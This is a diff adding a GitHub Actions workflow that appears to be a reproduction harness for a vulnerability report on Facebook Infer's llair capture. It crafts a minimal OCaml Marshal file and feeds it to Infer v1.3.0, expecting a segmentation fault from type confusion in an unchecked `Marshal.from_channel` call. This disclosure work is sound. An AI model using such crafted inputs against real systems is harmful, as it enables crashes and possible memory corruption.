@@ -1,0 +1,70 @@
+name: Infer Llair marshal validation
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    steps:
+      - name: Check out exact current Infer source
+        uses: actions/checkout@v4
+        with:
+          repository: facebook/infer
+          ref: cb4fcf8e1f571c02a669af978a6e69f3e2ddd062
+          path: infer-source
+          persist-credentials: false
+
+      - name: Download and verify official Infer v1.3.0 release
+        run: |
+          mkdir -p release
+          curl -fL --retry 5 \
+            https://github.com/facebook/infer/releases/download/v1.3.0/infer-linux-x86_64-v1.3.0.tar.xz \
+            -o release/infer-linux-x86_64-v1.3.0.tar.xz
+          echo '02be62ba931cb43e2d42bbf7abf4bd9a410cf8464cce5453934e25c90a825850  release/infer-linux-x86_64-v1.3.0.tar.xz' \
+            | sha256sum -c -
+          tar -xJf release/infer-linux-x86_64-v1.3.0.tar.xz -C release
+          release/infer-linux-x86_64-v1.3.0/bin/infer --version
+          echo '45c96d1003ec190a465861301155e131041fe03bd8223176b67276da70b3464b  infer-source/infer/src/llvm/LlvmFrontend.ml' \
+            | sha256sum -c -
+          grep -F 'let llair_program : Llair.program = Marshal.from_channel llair_in in' \
+            infer-source/infer/src/llvm/LlvmFrontend.ml
+
+      - name: Reproduce runtime type confusion and native crash
+        run: |
+          proof_dir=$(mktemp -d "$RUNNER_TEMP/infer-llair.XXXXXX")
+          probe="$proof_dir/probe.llair"
+
+          PROBE_PATH="$probe" python3 - <<'PY'
+          import os
+          import struct
+          from pathlib import Path
+
+          # Valid OCaml Marshal encoding of the immediate integer zero:
+          # small-header magic, one payload byte, no heap objects, then 0x40.
+          payload = struct.pack(">IIIII", 0x8495A6BE, 1, 0, 0, 0) + b"\x40"
+          Path(os.environ["PROBE_PATH"]).write_bytes(payload)
+          print(f"marshal_file_size={len(payload)}")
+          print("marshalled_value_type=immediate_integer")
+          PY
+
+          ulimit -c 0
+          set +e
+          (
+            cd "$proof_dir"
+            "$GITHUB_WORKSPACE/release/infer-linux-x86_64-v1.3.0/bin/infer" \
+              capture --capture-llair "$probe" --llair-source-file source.c
+          ) >"$proof_dir/infer.log" 2>&1
+          infer_status=$?
+          set -e
+
+          echo "infer_exit=$infer_status"
+          test "$infer_status" -eq 139
+          grep -F 'Capturing llair program...' "$proof_dir/infer.log" >/dev/null
+          echo 'native_signal=SIGSEGV'
+          echo 'finding_reproduced=true'
+          rm -f "$proof_dir/infer.log" "$probe"
